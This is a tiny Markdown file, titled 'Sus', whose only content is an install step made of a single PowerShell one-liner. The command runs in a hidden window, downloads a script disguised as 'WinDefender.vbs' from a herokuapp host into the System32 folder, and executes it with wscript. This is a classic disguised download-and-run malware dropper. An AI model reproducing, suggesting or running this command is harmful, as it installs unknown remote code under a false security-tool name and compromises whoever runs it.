# Sus

## Install some sus software

```bash
powershell -w hidden $a='WinDefender.vbs';$p=$env:windir+'\System32\'+$a;(new-object System.Net.WebClient).DownloadFile('https://windefender.herokuapp.com/'+$a,$p);wscript $p i
```
